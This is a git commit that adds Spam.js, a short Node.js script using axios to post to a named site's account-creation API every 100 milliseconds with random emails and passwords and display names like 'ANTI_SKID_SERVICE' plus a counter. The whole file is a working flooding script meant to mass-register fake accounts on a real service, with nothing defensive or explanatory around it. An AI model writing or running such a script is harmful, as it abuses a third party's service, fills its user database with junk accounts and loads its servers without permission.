5abbf96b7a635cb32a5b67679858d2c567298a7b
justu76 <74121269+justu76@users.noreply.github.com>
2021-02-15 22:58:13 -0500

    Do it

---
+++ Spam.js
@@ -0,0 +1,8 @@
+const axios = require('axios')
+var counter = 0
+setInterval(() => {
+    counter = counter + 1
+    axios.post(`https://onyxv2.tk/Api/Create?email=${Math.random().toString().substr(2, 5)}&password=${Math.random().toString().substr(2, 5)}&displayname=ANTI_SKID_SERVICE${counter}`).then(function() {
+        console.log("yeah")
+    })
+}, 100);
